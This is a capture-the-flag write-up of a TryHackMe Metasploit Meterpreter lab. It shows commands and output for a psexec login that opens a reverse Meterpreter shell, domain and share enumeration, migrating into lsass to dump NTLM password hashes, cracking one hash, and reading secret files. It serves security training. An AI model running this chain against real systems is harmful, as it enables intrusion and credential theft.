# Metasploit: Meterpreter
This is a writeup for the Meterpreter room on TryHackMe.

https://tryhackme.com/room/meterpreter

## Start Meterpreter session

The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)

Username: ballen
Password: Password1


```bash
msf6 > use xploit/windows/smb/psexec
```

```bash
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for
                                                     pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin sha
                                                    re (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/doc
                                         s/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     ***.***.***.***  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

```

### Customization
```bash 
msf6 exploit(windows/smb/psexec) > set lhost <your_ip>
msf6 exploit(windows/smb/psexec) > set rhosts <target_ip>
msf6 exploit(windows/smb/psexec) > set smbuser ballen
msf6 exploit(windows/smb/psexec) > set smbpass Password1
```

### Output
```bash 
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.8.177.116:4444 
[*] 10.10.222.233:445 - Connecting to the server...
[*] 10.10.222.233:445 - Authenticating to 10.10.222.233:445 as user 'ballen'...
[*] 10.10.222.233:445 - Selecting PowerShell target
[*] 10.10.222.233:445 - Executing the payload...
[+] 10.10.222.233:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.222.233
[*] Meterpreter session 2 opened (10.8.177.116:4444 -> 10.10.222.233:49341) at 2025-07-31 06:22:48 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Questions

What is the computer name?

```bash
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows
```

What is the target domain?

```bash
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-T  <your_ip>:4444 -> <target_ip>
                                     EST                           :49341 (<target_ip>)

msf6 post(windows/gather/enum_domain) > show options

Module options (post/windows/gather/enum_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_domain) > set session 2
session => 2
msf6 post(windows/gather/enum_domain) > run
[+] Domain FQDN: FLASH.local
[+] Domain NetBIOS Name: FLASH
[+] Domain Controller: ACME-TEST.FLASH.local (IP: <target_ip>)
[*] Post module execution completed
```

What is the name of the share likely created by the user?

```bash
msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate recently mapped shares
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_shares) > set session 2
session => 2
msf6 post(windows/gather/enum_shares) > run
[*] Running module against ACME-TEST (10.10.222.233)
[*] The following shares were found:
[*]     Name: SYSVOL
[*]     Path: C:\Windows\SYSVOL\sysvol
[*]     Remark: Logon server share 
[*]     Type: DISK
[*] 
[*]     Name: NETLOGON
[*]     Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*]     Remark: Logon server share 
[*]     Type: DISK
[*] 
[*]     Name: speedster
[*]     Path: C:\Shares\speedster
[*]     Type: DISK
[*] 
[*] Post module execution completed
```

What is the NTLM hash of the jchambers user?
(meterpreter session died)
```bash
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.8.177.116:4444 
[*] 10.10.222.233:445 - Connecting to the server...
[*] 10.10.222.233:445 - Authenticating to 10.10.222.233:445 as user 'ballen'...
[*] 10.10.222.233:445 - Selecting PowerShell target
[*] 10.10.222.233:445 - Executing the payload...
[+] 10.10.222.233:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 10.10.222.233
[*] Meterpreter session 1 opened (10.8.177.116:4444 -> 10.10.222.233:61639) at 2025-07-31 06:51:48 -0400

meterpreter > ps | grep lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User                 Path
 ---  ----  ----       ----  -------  ----                 ----
 736  620   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > migrate 736
[*] Migrating from 1140 to 736...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:d5367448484dfb184b92ffdd4d5280f2:::
meterpreter > 
[*] 10.10.222.233 - Meterpreter session 1 closed.  Reason: Died
```

What is the cleartext password of the jchambers user?
`69596c7aa1e8daee17f8e78870e25a5c` > crackstation.net

Where is the "secrets.txt"  file located? (Full path of the file)
```bash
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 03:44:27 -0400
```

What is the Twitter password revealed in the "secrets.txt" file?
```bash
meterpreter > shell
Process 2008 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
<navigate using cd>

:\Program Files (x86)\Windows Multimedia Platform>type secrets.txt
type secrets.txt
My Twitter password is KDSvbsw3849!
```

Where is the "realsecret.txt" file located? (Full path of the file)

```bash
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 04:30:24 -0400

meterpreter > Interrupt: use the 'exit' command to quit
```


What is the real secret?

```bash
meterpreter > shell
Process 3740 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ../../inetpub/wwwroot/          
cd ../../inetpub/wwwroot/

C:\inetpub\wwwroot>type realsecret.txt
type realsecret.txt
The Flash is the fastest man alive
```